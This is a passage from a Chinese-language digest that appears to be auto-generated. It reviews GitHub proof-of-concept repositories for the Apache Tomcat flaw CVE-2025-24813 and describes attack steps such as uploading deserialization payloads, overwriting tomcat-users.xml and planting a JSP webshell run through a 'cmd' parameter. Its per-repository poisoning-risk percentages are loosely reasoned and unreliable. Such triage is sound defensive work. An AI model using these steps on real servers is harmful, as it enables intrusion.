    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

